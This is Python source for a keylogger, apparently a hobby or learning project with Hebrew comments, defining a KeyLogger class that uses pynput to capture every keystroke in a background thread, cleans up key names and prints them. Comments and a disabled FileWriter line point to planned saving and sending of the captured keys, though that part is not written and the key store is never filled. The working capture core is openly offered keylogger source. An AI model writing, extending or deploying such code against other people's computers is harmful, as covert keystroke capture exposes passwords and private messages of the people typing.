from abc import ABC,abstractmethod
from pynput.keyboard import Key,Listener
import threading
import os


class IKeyLogger(ABC):
    @abstractmethod
    def start_logging(self) -> None:
        pass

    @abstractmethod
    def stop_logging(self) -> None:
        pass

    @abstractmethod
    def get_logged_keys(self) -> list[str]:
        pass


# קלאס שאחראי על ההקלטה מפעיל הקלטה בהדלקה ראשונה
class KeyLogger(IKeyLogger):

    def __init__(self):
        self.arr = list()
    # אחראי על הפעלת פונקציות יפוי ושמירה בכל לחיצה

    def __on_press(self,Key):
        key_nise = KeyLogger.nurmal_key(Key)
        print(key_nise)
        # לתקן את הדרך
        # FileWriter().write(key_nise)

        # פןנקציה שמפסיקה את התוכנה אם לחץ על קונטרול שיפט d
    @staticmethod
    def __on_release(key):
        try:
            if key.char == '\x04':  # Ctrl+D
                print("Exiting...")
                exit(0)
        except AttributeError:
            pass

    # אחראי ליפות את המקש
    @staticmethod
    def nurmal_key(key):
            key_nise = str(key)
            key_list = list(key_nise)
            if len(key_list) > 3:
                key_nise = ""
                for i in key_list[4:]:
                    key_nise += i
                key_nise = " " + key_nise + " "
                if key_nise == " space ":
                    return " "
                # if key_nise == " enter ":
                #     return "\n"
                # זה מוכן למקרה שהרצה לעשות שימוש במקשים מיוחדים
                return key_nise
            else:
                return key_list[1]

    #  מחלקה מופשטת של כותב. מורישה מתודה של כתוב ומתודה של שלח
    def start_logging(self):
        def _statr():
            with Listener(on_press=self.__on_press, on_release=self.__on_release) as l:
                self.lisiner = l
                self.lisiner.join()
        ran = threading.Thread(target=_statr)
        ran.start()

    def stop_logging(self) -> None:
        os._exit(0)

    def get_logged_keys(self) -> list[str]:
        c = self.arr.copy()
        self.arr = []
        return c




